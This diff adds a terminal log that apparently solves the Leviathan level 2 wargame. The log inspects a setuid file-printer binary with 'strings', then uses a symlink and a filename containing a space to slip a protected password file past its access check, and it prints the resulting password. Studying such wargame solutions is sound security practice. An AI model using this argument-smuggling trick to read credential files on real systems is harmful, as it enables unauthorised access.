@@ -1,0 +1,28 @@
+leviathan2@melinda:~$ strings printfile
+/lib/ld-linux.so.2
+>!N?
+5Tq:W
+libc.so.6
+_IO_stdin_used
+puts
+__stack_chk_fail
+system
+access
+__libc_start_main
+snprintf
+__gmon_start__
+GLIBC_2.4
+GLIBC_2.0
+PTRhp
+QVh-
+[^_]
+*** File Printer ***
+Usage: %s filename
+You cant have that file...
+/bin/cat %s
+;*2$"
+leviathan2@melinda:/tmp$ ln -s /etc/leviathan_pass/leviathan3
+leviathan2@melinda:/tmp$ touch "somefile leviathan3"
+leviathan2@melinda:/tmp$ ~/printfile "somefile leviathan3"
+/bin/cat: somefile: No such file or directory
+Ahdiemoo1j
